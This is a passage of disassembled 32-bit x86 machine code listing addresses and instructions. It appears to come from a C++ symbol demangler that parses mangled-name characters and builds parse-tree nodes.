  403a4f:	8b 48 10             	mov    0x10(%eax),%ecx
  403a52:	01 4b 2c             	add    %ecx,0x2c(%ebx)
  403a55:	0f b6 0a             	movzbl (%edx),%ecx
  403a58:	80 f9 43             	cmp    $0x43,%cl
  403a5b:	0f 84 8f 00 00 00    	je     0x403af0
  403a61:	80 f9 44             	cmp    $0x44,%cl
  403a64:	75 2a                	jne    0x403a90
  403a66:	0f b6 4a 01          	movzbl 0x1(%edx),%ecx
  403a6a:	83 e9 30             	sub    $0x30,%ecx
  403a6d:	80 f9 05             	cmp    $0x5,%cl
  403a70:	77 1e                	ja     0x403a90
  403a72:	0f b6 c9             	movzbl %cl,%ecx
  403a75:	ff 24 8d a0 f8 42 00 	jmp    *0x42f8a0(,%ecx,4)
  403a7c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403a80:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403a84:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  403a88:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403a8f:	90                   	nop
  403a90:	31 f6                	xor    %esi,%esi
  403a92:	e9 d0 fe ff ff       	jmp    0x403967
  403a97:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403a9e:	66 90                	xchg   %ax,%ax
  403aa0:	8b 53 28             	mov    0x28(%ebx),%edx
  403aa3:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  403aa7:	89 d5                	mov    %edx,%ebp
  403aa9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403ab0:	83 c0 01             	add    $0x1,%eax
  403ab3:	89 43 0c             	mov    %eax,0xc(%ebx)
  403ab6:	89 d8                	mov    %ebx,%eax
  403ab8:	e8 53 ea ff ff       	call   0x402510
  403abd:	89 f1                	mov    %esi,%ecx
  403abf:	ba 4e 00 00 00       	mov    $0x4e,%edx
  403ac4:	89 04 24             	mov    %eax,(%esp)
  403ac7:	89 d8                	mov    %ebx,%eax
  403ac9:	e8 f2 df ff ff       	call   0x401ac0
  403ace:	89 c6                	mov    %eax,%esi
  403ad0:	8b 43 0c             	mov    0xc(%ebx),%eax
  403ad3:	80 38 42             	cmpb   $0x42,(%eax)
  403ad6:	74 d8                	je     0x403ab0
  403ad8:	89 ea                	mov    %ebp,%edx
  403ada:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  403ade:	89 53 28             	mov    %edx,0x28(%ebx)
  403ae1:	e9 a8 fe ff ff       	jmp    0x40398e
  403ae6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403aed:	8d 76 00             	lea    0x0(%esi),%esi
  403af0:	0f b6 4a 01          	movzbl 0x1(%edx),%ecx
  403af4:	88 4c 24 14          	mov    %cl,0x14(%esp)
  403af8:	80 f9 49             	cmp    $0x49,%cl
  403afb:	0f 84 7a 02 00 00    	je     0x403d7b
  403b01:	0f b6 4c 24 14       	movzbl 0x14(%esp),%ecx
  403b06:	8d 71 cf             	lea    -0x31(%ecx),%esi
  403b09:	89 f1                	mov    %esi,%ecx
  403b0b:	80 f9 04             	cmp    $0x4,%cl
  403b0e:	77 80                	ja     0x403a90
  403b10:	0f be 4c 24 14       	movsbl 0x14(%esp),%ecx
  403b15:	83 c2 02             	add    $0x2,%edx
  403b18:	89 53 0c             	mov    %edx,0xc(%ebx)
  403b1b:	83 e9 30             	sub    $0x30,%ecx
  403b1e:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403b22:	8b 53 14             	mov    0x14(%ebx),%edx
  403b25:	3b 53 18             	cmp    0x18(%ebx),%edx
  403b28:	0f 8d 62 ff ff ff    	jge    0x403a90
  403b2e:	8b 4b 10             	mov    0x10(%ebx),%ecx
  403b31:	8d 34 92             	lea    (%edx,%edx,4),%esi
  403b34:	83 c2 01             	add    $0x1,%edx
  403b37:	8d 34 b1             	lea    (%ecx,%esi,4),%esi
  403b3a:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  403b41:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403b48:	89 53 14             	mov    %edx,0x14(%ebx)
  403b4b:	85 c0                	test   %eax,%eax
  403b4d:	0f 84 3d ff ff ff    	je     0x403a90
  403b53:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403b57:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  403b5e:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403b65:	c7 06 07 00 00 00    	movl   $0x7,(%esi)
  403b6b:	89 4e 0c             	mov    %ecx,0xc(%esi)
  403b6e:	89 46 10             	mov    %eax,0x10(%esi)
  403b71:	e9 f1 fd ff ff       	jmp    0x403967
  403b76:	c7 44 24 14 02 00 00 	movl   $0x2,0x14(%esp)
  403b7d:	00 
  403b7e:	83 c2 02             	add    $0x2,%edx
  403b81:	89 53 0c             	mov    %edx,0xc(%ebx)
  403b84:	8b 53 14             	mov    0x14(%ebx),%edx
  403b87:	3b 53 18             	cmp    0x18(%ebx),%edx
  403b8a:	0f 8d 00 ff ff ff    	jge    0x403a90
  403b90:	8b 4b 10             	mov    0x10(%ebx),%ecx
  403b93:	8d 34 92             	lea    (%edx,%edx,4),%esi
  403b96:	83 c2 01             	add    $0x1,%edx
  403b99:	8d 34 b1             	lea    (%ecx,%esi,4),%esi
  403b9c:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  403ba3:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403baa:	89 53 14             	mov    %edx,0x14(%ebx)
  403bad:	85 c0                	test   %eax,%eax
  403baf:	0f 84 db fe ff ff    	je     0x403a90
  403bb5:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403bb9:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  403bc0:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403bc7:	c7 06 08 00 00 00    	movl   $0x8,(%esi)
  403bcd:	89 4e 0c             	mov    %ecx,0xc(%esi)
  403bd0:	89 46 10             	mov    %eax,0x10(%esi)
  403bd3:	e9 8f fd ff ff       	jmp    0x403967
  403bd8:	c7 44 24 14 05 00 00 	movl   $0x5,0x14(%esp)
  403bdf:	00 
  403be0:	eb 9c                	jmp    0x403b7e
  403be2:	c7 44 24 14 04 00 00 	movl   $0x4,0x14(%esp)
  403be9:	00 
  403bea:	eb 92                	jmp    0x403b7e
  403bec:	c7 44 24 14 03 00 00 	movl   $0x3,0x14(%esp)
  403bf3:	00 
  403bf4:	eb 88                	jmp    0x403b7e
  403bf6:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  403bfd:	00 
  403bfe:	e9 7b ff ff ff       	jmp    0x403b7e
  403c03:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403c07:	90                   	nop
  403c08:	80 38 55             	cmpb   $0x55,(%eax)
  403c0b:	0f 85 7f fe ff ff    	jne    0x403a90
  403c11:	8d 50 01             	lea    0x1(%eax),%edx
  403c14:	89 53 0c             	mov    %edx,0xc(%ebx)
  403c17:	80 78 01 6c          	cmpb   $0x6c,0x1(%eax)
  403c1b:	0f 85 6f fe ff ff    	jne    0x403a90
  403c21:	83 c0 02             	add    $0x2,%eax
  403c24:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  403c28:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  403c2f:	00 
  403c30:	89 43 0c             	mov    %eax,0xc(%ebx)
  403c33:	89 d8                	mov    %ebx,%eax
  403c35:	e8 26 f9 ff ff       	call   0x403560
  403c3a:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  403c3e:	89 44 24 18          	mov    %eax,0x18(%esp)
  403c42:	85 c9                	test   %ecx,%ecx
  403c44:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  403c48:	0f 85 42 fe ff ff    	jne    0x403a90
  403c4e:	89 d8                	mov    %ebx,%eax
  403c50:	e8 7b f6 ff ff       	call   0x4032d0
  403c55:	85 c0                	test   %eax,%eax
  403c57:	0f 84 33 fe ff ff    	je     0x403a90
  403c5d:	8b 54 24 18          	mov    0x18(%esp),%edx
  403c61:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403c65:	85 d2                	test   %edx,%edx
  403c67:	0f 84 47 01 00 00    	je     0x403db4
  403c6d:	89 42 10             	mov    %eax,0x10(%edx)
  403c70:	8b 73 0c             	mov    0xc(%ebx),%esi
  403c73:	80 3e 45             	cmpb   $0x45,(%esi)
  403c76:	0f 85 14 fe ff ff    	jne    0x403a90
  403c7c:	8d 46 01             	lea    0x1(%esi),%eax
  403c7f:	89 44 24 14          	mov    %eax,0x14(%esp)
  403c83:	89 43 0c             	mov    %eax,0xc(%ebx)
  403c86:	0f b6 46 01          	movzbl 0x1(%esi),%eax
  403c8a:	3c 5f                	cmp    $0x5f,%al
  403c8c:	74 32                	je     0x403cc0
  403c8e:	89 54 24 18          	mov    %edx,0x18(%esp)
  403c92:	3c 6e                	cmp    $0x6e,%al
  403c94:	0f 84 f6 fd ff ff    	je     0x403a90
  403c9a:	89 d8                	mov    %ebx,%eax
  403c9c:	e8 8f df ff ff       	call   0x401c30
  403ca1:	83 c0 01             	add    $0x1,%eax
  403ca4:	89 c1                	mov    %eax,%ecx
  403ca6:	0f 88 e4 fd ff ff    	js     0x403a90
  403cac:	8b 43 0c             	mov    0xc(%ebx),%eax
  403caf:	8b 54 24 18          	mov    0x18(%esp),%edx
  403cb3:	80 38 5f             	cmpb   $0x5f,(%eax)
  403cb6:	89 44 24 14          	mov    %eax,0x14(%esp)
  403cba:	0f 85 d0 fd ff ff    	jne    0x403a90
  403cc0:	8b 44 24 14          	mov    0x14(%esp),%eax
  403cc4:	83 c0 01             	add    $0x1,%eax
  403cc7:	89 43 0c             	mov    %eax,0xc(%ebx)
  403cca:	8b 43 14             	mov    0x14(%ebx),%eax
  403ccd:	3b 43 18             	cmp    0x18(%ebx),%eax
  403cd0:	0f 8d ba fd ff ff    	jge    0x403a90
  403cd6:	89 44 24 14          	mov    %eax,0x14(%esp)
  403cda:	8d 34 80             	lea    (%eax,%eax,4),%esi
  403cdd:	8b 43 10             	mov    0x10(%ebx),%eax
  403ce0:	8d 34 b0             	lea    (%eax,%esi,4),%esi
  403ce3:	8b 44 24 14          	mov    0x14(%esp),%eax
  403ce7:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  403cee:	83 c0 01             	add    $0x1,%eax
  403cf1:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403cf8:	89 43 14             	mov    %eax,0x14(%ebx)
  403cfb:	c7 06 48 00 00 00    	movl   $0x48,(%esi)
  403d01:	89 56 0c             	mov    %edx,0xc(%esi)
  403d04:	89 4e 10             	mov    %ecx,0x10(%esi)
  403d07:	e9 5b fc ff ff       	jmp    0x403967
  403d0c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403d10:	83 c2 02             	add    $0x2,%edx
  403d13:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  403d17:	89 53 0c             	mov    %edx,0xc(%ebx)
  403d1a:	31 d2                	xor    %edx,%edx
  403d1c:	89 7c 24 14          	mov    %edi,0x14(%esp)
  403d20:	89 d5                	mov    %edx,%ebp
  403d22:	eb 17                	jmp    0x403d3b
  403d24:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403d28:	89 47 10             	mov    %eax,0x10(%edi)
  403d2b:	85 ed                	test   %ebp,%ebp
  403d2d:	0f 84 4d fd ff ff    	je     0x403a80
  403d33:	8b 43 0c             	mov    0xc(%ebx),%eax
  403d36:	80 38 45             	cmpb   $0x45,(%eax)
  403d39:	74 2d                	je     0x403d68
  403d3b:	89 d8                	mov    %ebx,%eax
  403d3d:	89 ef                	mov    %ebp,%edi
  403d3f:	e8 cc e7 ff ff       	call   0x402510
  403d44:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403d4b:	ba 54 00 00 00       	mov    $0x54,%edx
  403d50:	89 c1                	mov    %eax,%ecx
  403d52:	89 d8                	mov    %ebx,%eax
  403d54:	e8 67 dd ff ff       	call   0x401ac0
  403d59:	89 c5                	mov    %eax,%ebp
  403d5b:	85 ff                	test   %edi,%edi
  403d5d:	75 c9                	jne    0x403d28
  403d5f:	89 c6                	mov    %eax,%esi
  403d61:	eb c8                	jmp    0x403d2b
  403d63:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403d67:	90                   	nop
  403d68:	83 c0 01             	add    $0x1,%eax
  403d6b:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403d6f:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  403d73:	89 43 0c             	mov    %eax,0xc(%ebx)
  403d76:	e9 ec fb ff ff       	jmp    0x403967
  403d7b:	8d 42 01             	lea    0x1(%edx),%eax
  403d7e:	89 43 0c             	mov    %eax,0xc(%ebx)
  403d81:	0f be 42 02          	movsbl 0x2(%edx),%eax
  403d85:	8d 48 cf             	lea    -0x31(%eax),%ecx
  403d88:	80 f9 04             	cmp    $0x4,%cl
  403d8b:	0f 87 ff fc ff ff    	ja     0x403a90
  403d91:	83 c2 03             	add    $0x3,%edx
  403d94:	83 e8 30             	sub    $0x30,%eax
  403d97:	89 53 0c             	mov    %edx,0xc(%ebx)
  403d9a:	89 44 24 14          	mov    %eax,0x14(%esp)
  403d9e:	89 d8                	mov    %ebx,%eax
  403da0:	e8 5b eb ff ff       	call   0x402900
  403da5:	8b 43 28             	mov    0x28(%ebx),%eax
  403da8:	e9 75 fd ff ff       	jmp    0x403b22
  403dad:	31 c0                	xor    %eax,%eax
  403daf:	e9 3c fb ff ff       	jmp    0x4038f0
  403db4:	89 c2                	mov    %eax,%edx
  403db6:	e9 b5 fe ff ff       	jmp    0x403c70
  403dbb:	8b 53 0c             	mov    0xc(%ebx),%edx
  403dbe:	e9 7a fc ff ff       	jmp    0x403a3d
  403dc3:	85 f6                	test   %esi,%esi
  403dc5:	0f 84 c3 fb ff ff    	je     0x40398e
  403dcb:	89 f0                	mov    %esi,%eax
  403dcd:	31 f6                	xor    %esi,%esi
  403dcf:	e9 9b fb ff ff       	jmp    0x40396f
  403dd4:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403ddb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403ddf:	90                   	nop
  403de0:	55                   	push   %ebp
  403de1:	57                   	push   %edi
  403de2:	56                   	push   %esi
  403de3:	53                   	push   %ebx
  403de4:	83 ec 1c             	sub    $0x1c,%esp
  403de7:	8b 50 0c             	mov    0xc(%eax),%edx
  403dea:	80 3a 4c             	cmpb   $0x4c,(%edx)
  403ded:	0f 85 85 00 00 00    	jne    0x403e78
  403df3:	89 c3                	mov    %eax,%ebx
  403df5:	8d 42 01             	lea    0x1(%edx),%eax
  403df8:	89 43 0c             	mov    %eax,0xc(%ebx)
  403dfb:	0f b6 4a 01          	movzbl 0x1(%edx),%ecx
  403dff:	80 f9 5f             	cmp    $0x5f,%cl
  403e02:	0f 84 68 01 00 00    	je     0x403f70
  403e08:	80 f9 5a             	cmp    $0x5a,%cl
  403e0b:	74 7b                	je     0x403e88
  403e0d:	89 d8                	mov    %ebx,%eax
  403e0f:	e8 ec ea ff ff       	call   0x402900
  403e14:	89 c6                	mov    %eax,%esi
  403e16:	85 c0                	test   %eax,%eax
  403e18:	74 5e                	je     0x403e78
  403e1a:	83 38 28             	cmpl   $0x28,(%eax)
  403e1d:	8b 6b 0c             	mov    0xc(%ebx),%ebp
  403e20:	0f 84 b2 00 00 00    	je     0x403ed8
  403e26:	0f b6 55 00          	movzbl 0x0(%ebp),%edx
  403e2a:	bf 3e 00 00 00       	mov    $0x3e,%edi
  403e2f:	80 fa 6e             	cmp    $0x6e,%dl
  403e32:	0f 84 e8 00 00 00    	je     0x403f20
  403e38:	80 fa 45             	cmp    $0x45,%dl
  403e3b:	0f 84 6e 01 00 00    	je     0x403faf
  403e41:	8d 45 01             	lea    0x1(%ebp),%eax
  403e44:	eb 2e                	jmp    0x403e74
  403e46:	eb 18                	jmp    0x403e60
  403e48:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403e4f:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403e56:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403e5d:	8d 76 00             	lea    0x0(%esi),%esi
  403e60:	89 43 0c             	mov    %eax,0xc(%ebx)
  403e63:	89 c1                	mov    %eax,%ecx
  403e65:	0f b6 10             	movzbl (%eax),%edx
  403e68:	83 c0 01             	add    $0x1,%eax
  403e6b:	80 fa 45             	cmp    $0x45,%dl
  403e6e:	0f 84 cc 00 00 00    	je     0x403f40
  403e74:	84 d2                	test   %dl,%dl
  403e76:	75 e8                	jne    0x403e60
  403e78:	31 f6                	xor    %esi,%esi
  403e7a:	83 c4 1c             	add    $0x1c,%esp
  403e7d:	89 f0                	mov    %esi,%eax
  403e7f:	5b                   	pop    %ebx
  403e80:	5e                   	pop    %esi
  403e81:	5f                   	pop    %edi
  403e82:	5d                   	pop    %ebp
  403e83:	c3                   	ret
  403e84:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403e88:	80 f9 5f             	cmp    $0x5f,%cl
  403e8b:	0f 84 df 00 00 00    	je     0x403f70
  403e91:	8d 50 01             	lea    0x1(%eax),%edx
  403e94:	89 53 0c             	mov    %edx,0xc(%ebx)
  403e97:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  403e9b:	3c 47                	cmp    $0x47,%al
  403e9d:	0f 84 ed 00 00 00    	je     0x403f90
  403ea3:	3c 54                	cmp    $0x54,%al
  403ea5:	0f 84 e5 00 00 00    	je     0x403f90
  403eab:	31 d2                	xor    %edx,%edx
  403ead:	89 d8                	mov    %ebx,%eax
  403eaf:	e8 2c 19 00 00       	call   0x4057e0
  403eb4:	89 c6                	mov    %eax,%esi
  403eb6:	8b 43 0c             	mov    0xc(%ebx),%eax
  403eb9:	0f b6 10             	movzbl (%eax),%edx
  403ebc:	80 fa 45             	cmp    $0x45,%dl
  403ebf:	75 b7                	jne    0x403e78
  403ec1:	83 c0 01             	add    $0x1,%eax
  403ec4:	89 43 0c             	mov    %eax,0xc(%ebx)
  403ec7:	83 c4 1c             	add    $0x1c,%esp
  403eca:	89 f0                	mov    %esi,%eax
  403ecc:	5b                   	pop    %ebx
  403ecd:	5e                   	pop    %esi
  403ece:	5f                   	pop    %edi
  403ecf:	5d                   	pop    %ebp
  403ed0:	c3                   	ret
  403ed1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403ed8:	8b 40 0c             	mov    0xc(%eax),%eax
  403edb:	8b 50 10             	mov    0x10(%eax),%edx
  403ede:	85 d2                	test   %edx,%edx
  403ee0:	74 06                	je     0x403ee8
  403ee2:	8b 50 04             	mov    0x4(%eax),%edx
  403ee5:	29 53 2c             	sub    %edx,0x2c(%ebx)
  403ee8:	c7 44 24 04 b8 f8 42 	movl   $0x42f8b8,0x4(%esp)
  403eef:	00 
  403ef0:	8b 00                	mov    (%eax),%eax
  403ef2:	89 04 24             	mov    %eax,(%esp)
  403ef5:	e8 6e 46 01 00       	call   0x418568
  403efa:	0f b6 55 00          	movzbl 0x0(%ebp),%edx
  403efe:	85 c0                	test   %eax,%eax
  403f00:	0f 85 24 ff ff ff    	jne    0x403e2a
  403f06:	80 fa 45             	cmp    $0x45,%dl
  403f09:	0f 84 95 00 00 00    	je     0x403fa4
  403f0f:	bf 3e 00 00 00       	mov    $0x3e,%edi
  403f14:	80 fa 6e             	cmp    $0x6e,%dl
  403f17:	0f 85 24 ff ff ff    	jne    0x403e41
  403f1d:	8d 76 00             	lea    0x0(%esi),%esi
  403f20:	8d 45 01             	lea    0x1(%ebp),%eax
  403f23:	bf 3f 00 00 00       	mov    $0x3f,%edi
  403f28:	89 43 0c             	mov    %eax,0xc(%ebx)
  403f2b:	0f b6 55 01          	movzbl 0x1(%ebp),%edx
  403f2f:	89 c5                	mov    %eax,%ebp
  403f31:	e9 02 ff ff ff       	jmp    0x403e38
  403f36:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403f3d:	8d 76 00             	lea    0x0(%esi),%esi
  403f40:	29 e9                	sub    %ebp,%ecx
  403f42:	89 ea                	mov    %ebp,%edx
  403f44:	89 d8                	mov    %ebx,%eax
  403f46:	e8 85 dc ff ff       	call   0x401bd0
  403f4b:	89 f1                	mov    %esi,%ecx
  403f4d:	89 fa                	mov    %edi,%edx
  403f4f:	89 04 24             	mov    %eax,(%esp)
  403f52:	89 d8                	mov    %ebx,%eax
  403f54:	e8 67 db ff ff       	call   0x401ac0
  403f59:	89 c6                	mov    %eax,%esi
  403f5b:	8b 43 0c             	mov    0xc(%ebx),%eax
  403f5e:	0f b6 10             	movzbl (%eax),%edx
  403f61:	e9 56 ff ff ff       	jmp    0x403ebc
  403f66:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403f6d:	8d 76 00             	lea    0x0(%esi),%esi
  403f70:	8d 42 02             	lea    0x2(%edx),%eax
  403f73:	31 f6                	xor    %esi,%esi
  403f75:	89 43 0c             	mov    %eax,0xc(%ebx)
  403f78:	0f b6 52 02          	movzbl 0x2(%edx),%edx
  403f7c:	80 fa 5a             	cmp    $0x5a,%dl
  403f7f:	0f 85 37 ff ff ff    	jne    0x403ebc
  403f85:	e9 07 ff ff ff       	jmp    0x403e91
  403f8a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  403f90:	89 d8                	mov    %ebx,%eax
  403f92:	e8 79 0d 00 00       	call   0x404d10
  403f97:	89 c6                	mov    %eax,%esi
  403f99:	8b 43 0c             	mov    0xc(%ebx),%eax
  403f9c:	0f b6 10             	movzbl (%eax),%edx
  403f9f:	e9 18 ff ff ff       	jmp    0x403ebc
  403fa4:	83 c5 01             	add    $0x1,%ebp
  403fa7:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  403faa:	e9 cb fe ff ff       	jmp    0x403e7a
  403faf:	31 c9                	xor    %ecx,%ecx
  403fb1:	eb 8f                	jmp    0x403f42
  403fb3:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403fba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  403fc0:	56                   	push   %esi
  403fc1:	53                   	push   %ebx
  403fc2:	89 c3                	mov    %eax,%ebx
  403fc4:	83 ec 04             	sub    $0x4,%esp
  403fc7:	8b 40 0c             	mov    0xc(%eax),%eax
  403fca:	0f b6 10             	movzbl (%eax),%edx
  403fcd:	80 fa 4c             	cmp    $0x4c,%dl
  403fd0:	74 56                	je     0x404028
  403fd2:	7f 1c                	jg     0x403ff0
  403fd4:	83 ea 49             	sub    $0x49,%edx
  403fd7:	80 fa 01             	cmp    $0x1,%dl
  403fda:	77 5c                	ja     0x404038
  403fdc:	83 c0 01             	add    $0x1,%eax
  403fdf:	89 43 0c             	mov    %eax,0xc(%ebx)
  403fe2:	83 c4 04             	add    $0x4,%esp
  403fe5:	89 d8                	mov    %ebx,%eax
  403fe7:	5b                   	pop    %ebx
  403fe8:	5e                   	pop    %esi
  403fe9:	eb 65                	jmp    0x404050
  403feb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403fef:	90                   	nop
  403ff0:	80 fa 58             	cmp    $0x58,%dl
  403ff3:	75 43                	jne    0x404038
  403ff5:	83 c0 01             	add    $0x1,%eax
  403ff8:	8b 73 30             	mov    0x30(%ebx),%esi
  403ffb:	c7 43 30 01 00 00 00 	movl   $0x1,0x30(%ebx)
  404002:	89 43 0c             	mov    %eax,0xc(%ebx)
  404005:	89 d8                	mov    %ebx,%eax
  404007:	e8 b4 02 00 00       	call   0x4042c0
  40400c:	8b 53 0c             	mov    0xc(%ebx),%edx
  40400f:	89 73 30             	mov    %esi,0x30(%ebx)
  404012:	80 3a 45             	cmpb   $0x45,(%edx)
  404015:	75 31                	jne    0x404048
  404017:	83 c2 01             	add    $0x1,%edx
  40401a:	89 53 0c             	mov    %edx,0xc(%ebx)
  40401d:	83 c4 04             	add    $0x4,%esp
  404020:	5b                   	pop    %ebx
  404021:	5e                   	pop    %esi
  404022:	c3                   	ret
  404023:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404027:	90                   	nop
  404028:	83 c4 04             	add    $0x4,%esp
  40402b:	89 d8                	mov    %ebx,%eax
  40402d:	5b                   	pop    %ebx
  40402e:	5e                   	pop    %esi
  40402f:	e9 ac fd ff ff       	jmp    0x403de0
  404034:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404038:	83 c4 04             	add    $0x4,%esp
  40403b:	89 d8                	mov    %ebx,%eax
  40403d:	5b                   	pop    %ebx
  40403e:	5e                   	pop    %esi
  40403f:	e9 bc e8 ff ff       	jmp    0x402900
  404044:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404048:	31 c0                	xor    %eax,%eax
  40404a:	eb d1                	jmp    0x40401d
  40404c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404050:	55                   	push   %ebp
  404051:	57                   	push   %edi
  404052:	56                   	push   %esi
  404053:	53                   	push   %ebx
  404054:	89 c3                	mov    %eax,%ebx
  404056:	83 ec 2c             	sub    $0x2c,%esp
  404059:	8b 78 28             	mov    0x28(%eax),%edi
  40405c:	8b 40 0c             	mov    0xc(%eax),%eax
  40405f:	80 38 45             	cmpb   $0x45,(%eax)
  404062:	74 7c                	je     0x4040e0
  404064:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40406b:	00 
  40406c:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  404070:	eb 30                	jmp    0x4040a2
  404072:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404078:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40407f:	ba 30 00 00 00       	mov    $0x30,%edx
  404084:	89 d8                	mov    %ebx,%eax
  404086:	e8 35 da ff ff       	call   0x401ac0
  40408b:	89 06                	mov    %eax,(%esi)
  40408d:	85 c0                	test   %eax,%eax
  40408f:	74 1e                	je     0x4040af
  404091:	8b 53 0c             	mov    0xc(%ebx),%edx
  404094:	8d 70 10             	lea    0x10(%eax),%esi
  404097:	0f b6 02             	movzbl (%edx),%eax
  40409a:	3c 45                	cmp    $0x45,%al
  40409c:	74 22                	je     0x4040c0
  40409e:	3c 51                	cmp    $0x51,%al
  4040a0:	74 1e                	je     0x4040c0
  4040a2:	89 d8                	mov    %ebx,%eax
  4040a4:	e8 17 ff ff ff       	call   0x403fc0
  4040a9:	89 c1                	mov    %eax,%ecx
  4040ab:	85 c0                	test   %eax,%eax
  4040ad:	75 c9                	jne    0x404078
  4040af:	83 c4 2c             	add    $0x2c,%esp
  4040b2:	31 f6                	xor    %esi,%esi
  4040b4:	5b                   	pop    %ebx
  4040b5:	89 f0                	mov    %esi,%eax
  4040b7:	5e                   	pop    %esi
  4040b8:	5f                   	pop    %edi
  4040b9:	5d                   	pop    %ebp
  4040ba:	c3                   	ret
  4040bb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4040bf:	90                   	nop
  4040c0:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  4040c4:	3c 51                	cmp    $0x51,%al
  4040c6:	74 3f                	je     0x404107
  4040c8:	83 c2 01             	add    $0x1,%edx
  4040cb:	89 7b 28             	mov    %edi,0x28(%ebx)
  4040ce:	89 f0                	mov    %esi,%eax
  4040d0:	89 53 0c             	mov    %edx,0xc(%ebx)
  4040d3:	83 c4 2c             	add    $0x2c,%esp
  4040d6:	5b                   	pop    %ebx
  4040d7:	5e                   	pop    %esi
  4040d8:	5f                   	pop    %edi
  4040d9:	5d                   	pop    %ebp
  4040da:	c3                   	ret
  4040db:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4040df:	90                   	nop
  4040e0:	83 c0 01             	add    $0x1,%eax
  4040e3:	31 c9                	xor    %ecx,%ecx
  4040e5:	ba 30 00 00 00       	mov    $0x30,%edx
  4040ea:	89 43 0c             	mov    %eax,0xc(%ebx)
  4040ed:	89 d8                	mov    %ebx,%eax
  4040ef:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4040f6:	e8 c5 d9 ff ff       	call   0x401ac0
  4040fb:	83 c4 2c             	add    $0x2c,%esp
  4040fe:	89 c6                	mov    %eax,%esi
  404100:	5b                   	pop    %ebx
  404101:	89 f0                	mov    %esi,%eax
  404103:	5e                   	pop    %esi
  404104:	5f                   	pop    %edi
  404105:	5d                   	pop    %ebp
  404106:	c3                   	ret
  404107:	83 c2 01             	add    $0x1,%edx
  40410a:	8b 6b 30             	mov    0x30(%ebx),%ebp
  40410d:	c7 43 30 01 00 00 00 	movl   $0x1,0x30(%ebx)
  404114:	89 d8                	mov    %ebx,%eax
  404116:	89 53 0c             	mov    %edx,0xc(%ebx)
  404119:	e8 a2 01 00 00       	call   0x4042c0
  40411e:	89 6b 30             	mov    %ebp,0x30(%ebx)
  404121:	85 c0                	test   %eax,%eax
  404123:	74 23                	je     0x404148
  404125:	89 04 24             	mov    %eax,(%esp)
  404128:	89 f1                	mov    %esi,%ecx
  40412a:	ba 5e 00 00 00       	mov    $0x5e,%edx
  40412f:	89 d8                	mov    %ebx,%eax
  404131:	e8 8a d9 ff ff       	call   0x401ac0
  404136:	8b 53 0c             	mov    0xc(%ebx),%edx
  404139:	89 c6                	mov    %eax,%esi
  40413b:	0f b6 02             	movzbl (%edx),%eax
  40413e:	3c 45                	cmp    $0x45,%al
